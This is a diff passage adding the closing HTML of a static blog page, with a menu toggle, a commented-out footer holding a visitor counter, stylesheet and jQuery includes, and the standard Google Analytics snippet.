+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <!-- <footer id="footer">
+  <div class="footer-left">
+    <span><a href="/">主页</a></span>
+    Copyright &copy; 2022 Powered by Hopper
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav> 
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">访客: <span id="busuanzi_value_site_pv"></span>次</span>
+  </div>
+
+</footer>  -->
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
+
+
